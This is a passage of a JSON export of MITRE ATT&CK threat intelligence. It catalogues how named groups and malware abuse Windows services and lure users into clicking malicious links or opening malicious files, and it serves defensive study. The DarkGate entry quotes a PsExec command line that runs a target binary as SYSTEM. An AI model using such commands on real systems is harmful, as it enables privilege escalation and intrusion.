                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> tries to elevate privileges to SYSTEM using PsExec to locally execute as a service, such as cmd /c c:\\temp\\PsExec.exe -accepteula -j -d -s [Target Binary].[20]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can use PsExec to execute a payload on a remote host.[21]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has created Windows services to execute encoded PowerShell commands.[22]"
                    },
                    "S0032": {
                        "ID": "S0032",
                        "Name": "gh0st RAT",
                        "Description": "<name> can execute its service if the Service key exists. If the key does not exist, <name> will create and run the service.[23]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "<name> can create system services to aid in executing the payload.[24][25][26]"
                    },
                    "S0698": {
                        "ID": "S0698",
                        "Name": "HermeticWizard",
                        "Description": "<name> can use OpenRemoteServiceManager to create a service.[27]"
                    },
                    "S0376": {
                        "ID": "S0376",
                        "Name": "HOPLIGHT",
                        "Description": "<name> has used svchost.exe to execute a malicious DLL .[28]"
                    },
                    "S0203": {
                        "ID": "S0203",
                        "Name": "Hydraq",
                        "Description": "<name> uses svchost.exe to execute a malicious DLL included in a new service group.[29]"
                    },
                    "S0398": {
                        "ID": "S0398",
                        "Name": "HyperBro",
                        "Description": "<name> has the ability to start and stop a specified service.[30]"
                    },
                    "S0357": {
                        "ID": "S0357",
                        "Name": "Impacket",
                        "Description": "<name> contains various modules emulating other service execution tools such as PsExec.[31]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> has used Windows services as a way to execute its malicious payload.[32]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has used a tool known as RemoteExec (similar to PsExec) to remotely execute batch scripts and binaries.[33]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> can run a command on another machine using PsExec.[34]"
                    },
                    "S0451": {
                        "ID": "S0451",
                        "Name": "LoudMiner",
                        "Description": "<name> started the cryptomining virtual machine as a service on the infected machine.[35]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can create a remote service, let it run once, and then delete it.[36]"
                    },
                    "S0039": {
                        "ID": "S0039",
                        "Name": "Net",
                        "Description": "The net start and net stop commands can be used in <name> to execute or stop Windows services.[37]"
                    },
                    "S0056": {
                        "ID": "S0056",
                        "Name": "Net Crawler",
                        "Description": "<name> uses PsExec to perform remote service manipulation to execute a copy of itself as part of lateral movement.[38]"
                    },
                    "S0457": {
                        "ID": "S0457",
                        "Name": "Netwalker",
                        "Description": "Operators deploying <name> have used psexec and certutil to retrieve the <name> payload.[39]"
                    },
                    "S0368": {
                        "ID": "S0368",
                        "Name": "NotPetya",
                        "Description": "<name> can use PsExec to help propagate itself across a network.[40][41]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name>'s loader can create a new service named NtmsSvc to execute the payload.[42]"
                    },
                    "S0365": {
                        "ID": "S0365",
                        "Name": "Olympic Destroyer",
                        "Description": "<name> utilizes PsExec to help propagate itself across a network.[43]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, threat actors ran sc start to start the COMSysApp as part of the service hijacking and sc stop to stop and reconfigure the COMSysApp.[44]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors created services on remote systems for execution purposes.[45]"
                    },
                    "S0664": {
                        "ID": "S0664",
                        "Name": "Pandora",
                        "Description": "<name> has the ability to install itself as a Windows service.[46]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> contains an implementation of PsExec for remote execution.[47]"
                    },
                    "S0238": {
                        "ID": "S0238",
                        "Name": "Proxysvc",
                        "Description": "<name> registers itself as a service on the victim\u2019s machine to run as a standalone process.[48]"
                    },
                    "S0029": {
                        "ID": "S0029",
                        "Name": "PsExec",
                        "Description": "Microsoft Sysinternals <name> is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.[2]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> uses PsExec to execute a payload or commands on a remote host.[49]"
                    },
                    "S0583": {
                        "ID": "S0583",
                        "Name": "Pysa",
                        "Description": "<name> has used PsExec to copy and execute the ransomware.[50]"
                    },
                    "S0481": {
                        "ID": "S0481",
                        "Name": "Ragnar Locker",
                        "Description": "<name> has used sc.exe to execute a service that it creates.[51]"
                    },
                    "S0166": {
                        "ID": "S0166",
                        "Name": "RemoteCMD",
                        "Description": "<name> can execute commands remotely by creating a new service on the remote system.[52]"
                    },
                    "S0140": {
                        "ID": "S0140",
                        "Name": "Shamoon",
                        "Description": "<name> creates a new service named \"ntssrv\" to execute the payload. <name> can also spread via PsExec.[53][54]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has used Winexe to install a service on the remote system.[55][56]"
                    },
                    "S0533": {
                        "ID": "S0533",
                        "Name": "SLOTHFULMEDIA",
                        "Description": "<name> has the capability to start services.[57]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> can install a service to execute itself as a service.[58][59]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> can manage services and processes.[46]"
                    },
                    "S0668": {
                        "ID": "S0668",
                        "Name": "TinyTurla",
                        "Description": "<name> can install itself as a service on compromised machines.[60]"
                    },
                    "S0612": {
                        "ID": "S0612",
                        "Name": "WastedLocker",
                        "Description": "<name> can execute itself as a service.[61]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> can download and execute AdvancedRun.exe via sc.exe.[62][63]"
                    },
                    "S0191": {
                        "ID": "S0191",
                        "Name": "Winexe",
                        "Description": "<name> installs a service on the remote system, executes the command, then uninstalls the service.[64]"
                    },
                    "S0176": {
                        "ID": "S0176",
                        "Name": "Wingbird",
                        "Description": "<name> uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file.[65][66]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "<name> can run as a service using svchost.exe.[67]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used services.exe to execute scripts and executables during lateral movement within a victim's network. <name> has also used batch scripts that leverage PsExec to execute a previously transferred ransomware payload on a victim's network.[68][69][70]"
                    },
                    "S0123": {
                        "ID": "S0123",
                        "Name": "xCmd",
                        "Description": "<name> can be used to execute binaries on remote systems by creating and starting a service.[71]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> can create a new service for execution.[72]"
                    }
                }
            }
        },
        "tactic": "Execution",
        "description": "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one-time or temporary execution.",
        "Procedure": {
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has created system services to execute cryptocurrency mining software.[1]"
            }
        }
    },
    "T1204": {
        "ttp_name": "User Execution",
        "ttp_id": "T1204",
        "href": "/techniques/T1204",
        "subtechnique": {
            "001": {
                "name": "Malicious Link",
                "href": "/techniques/T1204/001",
                "description": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
                "Procedure": {
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name>'s spearphishing links required user interaction to navigate to the malicious website.[1]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.[2][3]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used various forms of spearphishing attempting to get a user to click on a malicous link.[4][5]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has lured victims into clicking malicious links delivered through spearphishing.[6]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has lured targets to download a Cobalt Strike beacon by including a malicious link within spearphishing emails.[7][8][9]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has lured users to click links to malicious HTML applications delivered via spearphishing emails.[10][11]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has sent spearphishing emails in an attempt to lure users to click on a malicious link.[12][13]"
                    },
                    "S0475": {
                        "ID": "S0475",
                        "Name": "BackConfig",
                        "Description": "<name> has compromised victims via links to URLs hosting malicious content.[14]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can gain execution after a user clicks on a malicious link to decoy landing pages hosted on Google Docs.[15][16][17]"
                    },
                    "G0098": {
                        "ID": "G0098",
                        "Name": "BlackTech",
                        "Description": "<name> has used e-mails with malicious links to lure victims into installing malware.[18]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> has relied upon a user downloading a file from a OneDrive link for execution.[19][20]"
                    },
                    "C0011": {
                        "ID": "C0011",
                        "Name": "C0011",
                        "Description": "During <name>, Transparent Tribe relied on student targets to click on a malicious link sent via email.[21]"
                    },
                    "C0021": {
                        "ID": "C0021",
                        "Name": "C0021",
                        "Description": "During <name>, the threat actors lured users into clicking a malicious link which led to the download of a  ZIP archive containing a malicious .LNK file.[22]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has sent emails containing malicious links that require users to execute a file or macro to infect the victim machine.[23][24][25]"
                    },
                    "G0142": {
                        "ID": "G0142",
                        "Name": "Confucius",
                        "Description": "<name> has lured victims into clicking on a malicious link sent through spearphishing.[26]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name>  has sent spearphishing emails that required the user to click on a malicious link and subsequently open a decoy document with a malicious loader.[27]"
                    },
                    "G0066": {
                        "ID": "G0066",
                        "Name": "Elderwood",
                        "Description": "<name> has leveraged multiple types of spearphishing in order to attempt to get a user to open links.[28][29]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has attempted to lure users to click on a malicious link within a spearphishing email.[30]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has relied upon users clicking on a malicious link delivered through spearphishing.[31][32]"
                    },
                    "G0120": {
                        "ID": "G0120",
                        "Name": "Evilnum",
                        "Description": "<name> has sent spearphishing emails designed to trick the recipient into opening malicious shortcut links which downloads a .LNK file.[33]"
                    },
                    "G1011": {
                        "ID": "G1011",
                        "Name": "EXOTIC LILY",
                        "Description": "<name> has used malicious links to lure users into executing malicious payloads.[34]"
                    },
                    "G0085": {
                        "ID": "G0085",
                        "Name": "FIN4",
                        "Description": "<name> has lured victims to click malicious links delivered via spearphishing emails (often sent from compromised accounts).[35][36]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has used malicious links to lure victims into downloading malware.[37]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used emails with malicious links to lure victims into installing malware.[38][39][40]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> has used malicious links to gain execution on victim machines.[41][42]"
                    },
                    "S0561": {
                        "ID": "S0561",
                        "Name": "GuLoader",
                        "Description": "<name> has relied upon users clicking on links to malicious documents.[43]"
                    },
                    "S0499": {
                        "ID": "S0499",
                        "Name": "Hancitor",
                        "Description": "<name> has relied upon users clicking on a malicious link delivered through phishing.[44]"
                    },
                    "S0528": {
                        "ID": "S0528",
                        "Name": "Javali",
                        "Description": "<name> has achieved execution through victims clicking links to malicious websites.[45]"
                    },
                    "S0585": {
                        "ID": "S0585",
                        "Name": "Kerrdown",
                        "Description": "<name> has gained execution through victims opening malicious links.[9]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has lured victims into clicking malicious links.[46]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> has relied on victims clicking on a malicious link delivered via email.[47]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has relied upon users clicking on links to malicious files.[47]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has sent spearphishing email links attempting to get a user to click.[48][49]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has lured victims into clicking malicious Dropbox download links delivered through spearphishing.[50]"
                    },
                    "G0095": {
                        "ID": "G0095",
                        "Name": "Machete",
                        "Description": "<name> has has relied on users opening malicious links delivered through spearphishing to execute malware.[51][52][53]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has attempted to lure victims into opening malicious links embedded in emails.[54][55]"
                    },
                    "S0530": {
                        "ID": "S0530",
                        "Name": "Melcoz",
                        "Description": "<name> has gained execution through victims opening malicious links.[45]"
                    },
                    "G0103": {
                        "ID": "G0103",
                        "Name": "Mofang",
                        "Description": "<name>'s spearphishing emails required a user to click the link to connect to a compromised website.[56]"
                    },
                    "G0021": {
                        "ID": "G0021",
                        "Name": "Molerats",
                        "Description": "<name> has sent malicious links via email trick users into opening a RAR archive and running an executable.[57][58]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has distributed URLs in phishing e-mails that link to lure documents.[59][60][61]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has sent malicious links including links directing victims to a Google Drive folder.[62][63][64]"
                    },
                    "G1020": {
                        "ID": "G1020",
                        "Name": "Mustard Tempest",
                        "Description": "<name> has lured users into downloading malware through malicious links in fake advertisements and spearphishing emails.[65][66]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> has been executed through convincing victims into clicking malicious links.[67][43]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors enticed users to click on links in spearphishing emails to download malware.[68]"
                    },
                    "S0644": {
                        "ID": "S0644",
                        "Name": "ObliqueRAT",
                        "Description": "<name> has gained execution on targeted systems through luring users to click on links to malicious URLs.[69][70]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has delivered malicious links to achieve execution on the target system.[71][72][73]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group lured users into executing a malicious link to disclose private account information or provide initial access.[74][75]"
                    },
                    "C0016": {
                        "ID": "C0016",
                        "Name": "Operation Dust Storm",
                        "Description": "During <name>, the threat actors relied on a victim clicking on a malicious link sent via email.[76]"
                    },
                    "C0005": {
                        "ID": "C0005",
                        "Name": "Operation Spalax",
                        "Description": "During <name>, the threat actors relied on a victim to click on a malicious link distributed via phishing emails.[77]"
                    },
                    "S1017": {
                        "ID": "S1017",
                        "Name": "OutSteel",
                        "Description": "<name> has relied on a user to click a malicious link within a spearphishing email.[30]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> has used spearphishing with links to try to get users to click, download and open malicious files.[78][79][80][14]"
                    },
                    "S0435": {
                        "ID": "S0435",
                        "Name": "PLEAD",
                        "Description": "<name> has been executed via malicious links in e-mails.[18]"
                    },
                    "S0453": {
                        "ID": "S0453",
                        "Name": "Pony",
                        "Description": "<name> has attempted to lure targets into clicking links in spoofed emails from legitimate banks.[81]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has gained execution through users opening malicious links.[82][83][84][85][86][87][88]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has relied on users to click on a malicious link delivered via a spearphishing.[30]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.[89]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has lured targets to click on malicious links to gain execution in the target environment.[90][91][92][93]"
                    },
                    "S0649": {
                        "ID": "S0649",
                        "Name": "SMOKEDHAM",
                        "Description": "<name> has relied upon users clicking on a malicious link delivered through phishing.[94]"
                    },
                    "S1086": {
                        "ID": "S1086",
                        "Name": "Snip3",
                        "Description": "<name> has been executed through luring victims into clicking malicious links.[95]"
                    },
                    "S1124": {
                        "ID": "S1124",
                        "Name": "SocGholish",
                        "Description": "<name> has lured victims into interacting with malicious links on compromised websites for execution.[66]"
                    },
                    "S0646": {
                        "ID": "S0646",
                        "Name": "SpicyOmelette",
                        "Description": "<name> has been executed through malicious links within spearphishing emails.[25]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has relied on victims to click on a malicious link send via phishing campaigns.[96]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used malicious links to cloud and web services to gain execution on victim machines.[97][67]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used lures to get users to click links in emails and attachments. For example, <name> makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. [98][99][100][101][102][103][104][105]"
                    },
                    "G0134": {
                        "ID": "G0134",
                        "Name": "Transparent Tribe",
                        "Description": "<name> has directed users to open URLs hosting malicious content.[69][70]"
                    },
                    "S0436": {
                        "ID": "S0436",
                        "Name": "TSCookie",
                        "Description": "<name> has been executed via malicious links embedded in e-mails spoofing the Ministries of Education, Culture, Sports, Science and Technology of Japan.[106]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used spearphishing via a link to get users to download and run their malware.[107]"
                    },
                    "G0112": {
                        "ID": "G0112",
                        "Name": "Windshift",
                        "Description": "<name> has used links embedded in e-mails to lure victims into executing malicious code.[108]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has lured victims into clicking a malicious link delivered through spearphishing.[109]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has used malicious links in e-mails to lure victims into downloading malware.[110][111]"
                    }
                }
            },
            "002": {
                "name": "Malicious File",
                "href": "/techniques/T1204/002",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.Adversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.[1] While Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
                "Procedure": {
                    "C0028": {
                        "ID": "C0028",
                        "Name": "2015 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team leveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them. [2]"
                    },
                    "G0018": {
                        "ID": "G0018",
                        "Name": "admin@338",
                        "Description": "<name> has attempted to get victims to launch malicious Microsoft Word attachments delivered via spearphishing emails.[3]"
                    },
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> has been executed through malicious e-mail attachments [4]"
                    },
                    "G0130": {
                        "ID": "G0130",
                        "Name": "Ajax Security Team",
                        "Description": "<name> has lured victims into executing malicious files.[5]"
                    },
                    "G0138": {
                        "ID": "G0138",
                        "Name": "Andariel",
                        "Description": "<name> has attempted to lure victims into enabling malicious macros within email attachments.[6]"
                    },
                    "G1007": {
                        "ID": "G1007",
                        "Name": "Aoqin Dragon",
                        "Description": "<name> has lured victims into opening weaponized documents, fake external drives, and fake antivirus to execute malicious payloads.[7]"
                    },
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> has required user execution of a malicious MSI installer.[8]"
                    },
                    "S0622": {
                        "ID": "S0622",
                        "Name": "AppleSeed",
                        "Description": "<name> can achieve execution through users running malicious file attachments distributed via email.[9]"
                    },
                    "G0099": {
                        "ID": "G0099",
                        "Name": "APT-C-36",
                        "Description": "<name> has prompted victims to accept macros in order to execute the subsequent payload.[10]"
                    },
                    "G0005": {
                        "ID": "G0005",
                        "Name": "APT12",
                        "Description": "<name> has attempted to get victims to open malicious Microsoft Word and PDF attachment sent via spearphishing.[11][12]"
                    },
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "<name> attempted to get users to launch malicious attachments delivered via spearphishing emails.[13]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> attempted to get users to click on Microsoft Office attachments containing malicious macro scripts.[14][15][16]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used various forms of spearphishing attempting to get a user to open attachments, including, but not limited to, malicious Microsoft Word documents, .pdf, and .lnk files. [17][18][19]"
                    },
                    "G0013": {
                        "ID": "G0013",
                        "Name": "APT30",
                        "Description": "<name> has relied on users to execute malicious file attachments delivered via spearphishing emails.[20]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.[21][22][23][24][25]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used malicious e-mail attachments to lure victims into executing malware.[26]"
                    },
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> has sent spearphishing attachments attempting to get a user to open them.[27]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name>  has attempted to lure victims into enabling malicious macros within email attachments.[28]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has sent spearphishing emails in an attempt to lure users to click on a malicious attachment.[29][30][31][32]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> has used malicious files including VBS, LNK, and HTML for execution.[33]"
                    },
                    "S0606": {
                        "ID": "S0606",
                        "Name": "Bad Rabbit",
                        "Description": "<name> has been executed through user installation of an executable disguised as a flash installer.[34][35]"
                    },
                    "S0642": {
                        "ID": "S0642",
                        "Name": "BADFLICK",
                        "Description": "<name> has relied upon users clicking on a malicious attachment delivered through spearphishing.[36]"
                    },
                    "S0234": {
                        "ID": "S0234",
                        "Name": "Bandook",
                        "Description": "<name> has used lure documents to convince the user to enable macros.[37]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> has relied on users to execute malicious file attachments delivered via spearphishing emails.[38]"
                    },
                    "G1002": {
                        "ID": "G1002",
                        "Name": "BITTER",
                        "Description": "<name> has attempted to lure victims into opening malicious attachments delivered via spearphishing.[39][40]"
                    },
                    "S1070": {
                        "ID": "S1070",
                        "Name": "Black Basta",
                        "Description": "<name> has been downloaded and executed from malicious Excel files.[41][42]"
                    },
                    "G0098": {
                        "ID": "G0098",
                        "Name": "BlackTech",
                        "Description": "<name> has used e-mails with malicious documents to lure victims into installing malware.[43][44]"
                    },
                    "S0520": {
                        "ID": "S0520",
                        "Name": "BLINDINGCAN",
                        "Description": "<name> has lured victims into executing malicious macros embedded within Microsoft Office documents.[45]"
                    },
                    "S0635": {
                        "ID": "S0635",
                        "Name": "BoomBox",
                        "Description": "<name> has gained execution through user interaction with a malicious file.[46]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.[47][48]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> has gained execution through users opening malicious documents.[49]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> has relied upon a user opening an ISO file to enable execution of malicious shortcut files and DLLs.[50][51][52][53]"
                    },
                    "S0482": {
                        "ID": "S0482",
                        "Name": "Bundlore",
                        "Description": "<name> has attempted to get users to execute a malicious .app file that looks like a Flash Player update.[54]"
                    },
                    "C0011": {
                        "ID": "C0011",
                        "Name": "C0011",
                        "Description": "During <name>, Transparent Tribe relied on a student target to open a malicious document delivered via email.[55]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "During <name>, the threat actors relied on users to enable macros within a malicious Microsoft Word document.[56]"
                    },
                    "S0348": {
                        "ID": "S0348",
                        "Name": "Cardinal RAT",
                        "Description": "<name> lures victims into executing malicious macros embedded within Microsoft Excel documents.[57]"
                    },
                    "S0465": {
                        "ID": "S0465",
                        "Name": "CARROTBALL",
                        "Description": "<name> has been executed through users being lured into opening malicious e-mail attachments.[58]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> requires the user to click on the malicious Word document to execute the next part of the attack.[59]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> has gained execution through luring victims into opening malicious files.[60]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has sent emails containing malicious attachments that require users to execute a file or macro to infect the victim machine.[61][62]"
                    },
                    "G0142": {
                        "ID": "G0142",
                        "Name": "Confucius",
                        "Description": "<name> has lured victims to execute malicious attachments included in crafted spearphishing emails related to current topics.[63]"
                    },
                    "S0527": {
                        "ID": "S0527",
                        "Name": "CSPY Downloader",
                        "Description": "<name> has been delivered via malicious documents with embedded macros.[64]"
                    },
                    "G1012": {
                        "ID": "G1012",
                        "Name": "CURIUM",
                        "Description": "<name> has lured users into opening malicious files delivered via social media.[65]"
                    },
                    "S1014": {
                        "ID": "S1014",
                        "Name": "DanBot",
                        "Description": "<name> has relied on victims' opening a malicious file for initial execution.[66][67]"
                    },
                    "G0070": {
                        "ID": "G0070",
                        "Name": "Dark Caracal",
                        "Description": "<name> makes their malware look like Flash Player, Office, or PDF documents in order to entice a user to click on it.[68]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> initial infection payloads can masquerade as pirated media content requiring user interaction for code execution.[69] <name> is distributed through phishing links to VBS or MSI objects requiring user interaction for execution.[70]"
                    },
                    "G0012": {
                        "ID": "G0012",
                        "Name": "Darkhotel",
                        "Description": "<name> has sent spearphishing emails in an attempt to lure users into clicking on a malicious attachments.[71][72]"
                    },
                    "G0079": {
                        "ID": "G0079",
                        "Name": "DarkHydrus",
                        "Description": "<name> has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.[73][74]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> has relied on a user to open a malicious document or archived file delivered via email for initial execution.[75]"
                    },
                    "S1088": {
                        "ID": "S1088",
                        "Name": "Disco",
                        "Description": "<name> has been executed through inducing user interaction with malicious .zip and .msi files.[76]"
                    },
                    "S1021": {
                        "ID": "S1021",
                        "Name": "DnsSystem",
                        "Description": "<name> has lured victims into opening macro-enabled Word documents for execution.[77]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has used various forms of spearphishing in attempts to get users to open malicious attachments.[78]"
                    },
                    "S0384": {
                        "ID": "S0384",
                        "Name": "Dridex",
                        "Description": "<name> has relied upon users clicking on a malicious attachment delivered through spearphishing.[79]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> required users to click on a malicious file for the loader to activate.[80]"
                    },
                    "G0066": {
                        "ID": "G0066",
                        "Name": "Elderwood",
                        "Description": "<name> has leveraged multiple types of spearphishing in order to attempt to get a user to open attachments.[81][82]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has attempted to lure victims into executing malicious files.[83]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has relied upon users clicking on a malicious attachment delivered through spearphishing.[84][85][86]"
                    },
                    "S0634": {
                        "ID": "S0634",
                        "Name": "EnvyScout",
                        "Description": "<name> has been executed through malicious files attached to e-mails.[46]"
                    },
                    "G1011": {
                        "ID": "G1011",
                        "Name": "EXOTIC LILY",
